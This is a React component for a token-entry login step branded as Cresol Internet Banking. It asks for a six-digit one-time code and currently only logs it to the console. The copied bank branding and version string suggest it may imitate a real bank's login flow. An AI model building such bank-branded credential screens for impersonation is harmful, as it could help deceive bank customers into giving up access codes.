
import React, { useState } from "react";
import { ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";

const TokenPage = () => {
  const [token, setToken] = useState("");
  const navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Aqui seria a validação final do token
    console.log("Token validado:", token);
    // Redirecionar para o dashboard ou página principal após login
  };

  const handleBack = () => {
    navigate("/sms");
  };

  return (
    <div className="min-h-screen flex bg-[#fff]">
      {/* Left: Formulário Token */}
      <div className="w-1/2 flex flex-col items-center px-[7%] pt-20 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          {/* Botão Voltar */}
          <button
            onClick={handleBack}
            className="flex items-center text-gray-600 hover:text-gray-800 mb-6 transition-colors"
          >
            <ArrowLeft size={20} className="mr-2" />
            Voltar
          </button>

          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 mb-6"
          />

          <h1 className="text-2xl font-semibold text-gray-600 mb-3">Token de Acesso</h1>
          <p className="text-[1.1rem] text-gray-600 mb-8">
            Digite o token gerado no seu dispositivo de segurança ou aplicativo.
          </p>

          <form onSubmit={handleSubmit} className="mt-6">
            <div className="mb-6">
              <label className="block text-sm text-gray-700 font-medium mb-1">Token</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest"
                placeholder="000000"
                value={token}
                onChange={(e) => setToken(e.target.value.replace(/\D/g, '').slice(0, 6))}
                maxLength={6}
                autoComplete="one-time-code"
              />
            </div>

            <button
              type="submit"
              className="w-full h-11 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg shadow mb-6"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
              disabled={token.length !== 6}
            >
              Acessar
            </button>

            <div className="text-center">
              <p className="text-sm text-gray-600">
                Problemas com seu token?{" "}
                <a href="#" className="text-orange-500 hover:text-orange-600 transition font-medium">
                  Entre em contato
                </a>
              </p>
            </div>
          </form>

          {/* Rodapé */}
          <div className="mt-12 text-center text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher */}
      <div className="w-1/2 hidden lg:block bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default TokenPage;
